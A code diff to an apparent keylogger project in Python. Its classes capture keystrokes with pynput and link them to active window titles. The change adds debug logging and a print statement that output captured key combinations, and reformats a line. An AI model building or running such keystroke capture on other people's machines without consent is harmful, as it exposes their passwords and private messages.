@@ -1,4 +1,5 @@
 from datetime import datetime
+import logging
 import threading
 import keyboard
 from pynput import keyboard as kb
@@ -6,6 +7,7 @@ from typing import List, Protocol, Set, Tuple
 
 from keylogger.data_wrapper import DataWrapper
 
+logger = logging.getLogger(__name__)
 
 SPECIAL = {
     kb.Key.shift,
@@ -138,9 +140,11 @@ class LinuxKeylogger:
         """
         get the data that has been collected and reset the buffer.
         """
+        self.start_new_sequence()
         with self._lock:
             data = self.buffer.copy()
             self.buffer.clear()
+            logger.debug("Data collected: %s", data)
             return data
 
     def start_new_sequence(self, active_window: str = ""):
@@ -179,6 +183,7 @@ class LinuxKeylogger:
 
                 key_comb = self._build_key_combo_printable(key)
                 self.sequence.append(key_comb)
+                print(key_comb, key)
 
     def _on_release(self, key):
         try:
@@ -192,8 +197,7 @@ if __name__ == "__main__":
     from .active_window import WindowTracker
 
     keylogger = WindowsKeylogger()
-    window_tracker = WindowTracker(
-        lambda x: keylogger.start_new_sequence(x.title))
+    window_tracker = WindowTracker(lambda x: keylogger.start_new_sequence(x.title))
 
     keylogger.start()
     window_tracker.start()
